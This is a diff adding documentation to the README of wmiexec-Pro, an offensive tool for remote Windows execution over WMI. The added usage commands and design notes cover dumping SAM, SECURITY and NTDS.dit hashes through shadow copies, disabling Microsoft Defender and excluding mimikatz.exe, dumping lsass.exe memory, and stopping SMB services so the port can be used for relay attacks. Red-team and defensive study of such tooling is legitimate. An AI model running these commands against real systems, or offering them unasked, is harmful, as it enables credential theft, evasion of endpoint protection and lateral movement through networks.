@@ -1,5 +1,9 @@
 <a name="readme-top"></a>
 
+<p align="center">
+  <img src="images/logo.png" alt="wmiexec-Pro" width="400"/>
+</p>
+
 # wmiexec-Pro
 
 New generation of wmiexec.py.
@@ -55,6 +59,10 @@ The new generation of wmiexec.py, more new features, whole the operations only w
 - New module: Remote enable WinRM without touching CMD
 - New module: Service manager
 - New module: RID-Hijack
+- New module: Hashdump (SAM / SECURITY / NTDS.dit via VSS + PS_ModuleFile, fully WMI-native, no subprocess)
+- New module: Defender management (toggle core protections, manage exclusions via MSFT_MpPreference)
+- New module: Process memory dump (MiniDumpWriteDump trigger + PS_ModuleFile retrieval)
+- New module: SMB takeover (stop SMB services to free TCP/445)
 - Enhancement: Get command execution output in new way
 - Enhancement: Execute vbs file
 
@@ -155,7 +163,30 @@ RID Hijack:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 500 -action backup (This will save user profile data as json file)
    python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -user 500 -remove (Use guest user remove administrator user profile after rid hijacked)
    python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -restore "backup.json" (Restore user profile for target user)
-   
+
+Hashdump (SAM / SECURITY / NTDS.dit via VSS + PS_ModuleFile):
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 hashdump -dump sss (SAM + SECURITY + SYSTEM, default native method)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 hashdump -dump ntds (NTDS.dit + SYSTEM, run on Domain Controller)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 hashdump -dump sss -method legacy (VBS + ADODB fallback for older OS)
+
+Defender (MSFT_MpPreference):
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 defender -action check (Show protection status and exclusions)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 defender -action disable (Disable all core protection features)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 defender -action enable (Restore Microsoft default protection)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 defender -action exclude -path "C:\temp" -process "mimikatz.exe" -extension "exe"
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 defender -action remove  -path "C:\temp" -process "mimikatz.exe" -extension "exe"
+
+Process Dump:
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 processdump -action list (Enumerate remote processes)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 processdump -action list -name lsass.exe (Filter by name)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 processdump -action dump -proc lsass.exe -dl -cleanup (Dump and download via PS_ModuleFile, then delete remote dump file)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 processdump -action dump -pid 1234 -dl
+
+SMB Takeover (free TCP/445 on target for SMB relay / SMB-based tools):
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 smb-takeover -action check
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 smb-takeover -action stop  (Stop LanmanServer and dependents)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 smb-takeover -action start (Restore SMB services)
+
 ```
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -216,6 +247,20 @@ RID Hijack:
 - classMethodEx method:
   - For create class: execute the vbs scritp : `CreateClass.vbs` to create simple class. (Why? Have no idea how to use `PutClass` method in impacket.)
   - For remove class: call `DeleteClass` method to remove class.
+
+- hashdump module:
+  - native method (default, Win8 / Server 2012+): create a Volume Shadow Copy via `Win32_ShadowCopy.Create`, read SAM / SECURITY / SYSTEM (or NTDS.dit + SYSTEM) directly from the shadow copy device path through `PS_ModuleFile.FileData`. No subprocess, no temp WMI class, no event subscription.
+  - legacy method: VBS + ADODB.Stream copies files from the shadow copy and base64-stashes them into a temporary WMI class.
+  - Hashes are parsed locally with impacket's secretsdump (SAMHashes / LSASecrets / NTDSHashes).
+
+- defender module:
+  - Abuses `MSFT_MpPreference` under namespace `root/Microsoft/Windows/Defender`. Calls `Set` / `Add` / `Remove` with kwargs-only InParams; unspecified parameters are null-marked via NdTable so existing settings stay intact (equivalent to `wmic ... call Set <field>=<value>` semantics).
+
+- processdump module:
+  - Triggers `MiniDumpWriteDump` on the target process via WMI, writing the dump to disk on the target. Optional retrieval pulls the dump file back through `PS_ModuleFile.FileData` and can clean up the remote artifact afterwards.
+
+- smb-takeover module:
+  - Stops `LanmanServer` and its dependent services to free TCP/445 on the target. Useful when a SMB relay / SMB-based tool needs the port available after WMI lateral movement.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
